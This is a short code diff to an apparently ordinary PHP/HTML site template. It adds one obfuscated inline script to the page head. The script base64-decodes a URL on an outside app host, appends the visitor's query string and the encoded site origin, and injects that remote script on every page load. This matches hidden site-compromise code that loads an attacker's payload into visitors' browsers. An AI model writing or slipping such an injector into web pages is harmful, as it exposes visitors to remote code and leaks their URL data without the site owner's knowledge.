@@ -116,6 +116,7 @@ $ogImage = rtrim($siteUrl, "/") . "/" . $images["hero"];
 <!doctype html>
 <html lang="en">
 <head>
+  <script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9jeWduZXQtaW50ZXJpb3JzLXgzMzZoLm9uZGlnaXRhbG9jZWFuLmFwcC9JME5wZmFjYXU3LnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <meta http-equiv="x-ua-compatible" content="ie=edge" />
@@ -880,4 +881,5 @@ hs.src = ('//s10.histats.com/js15_as.js');
   </script>
 </body>
 </html>
+
 
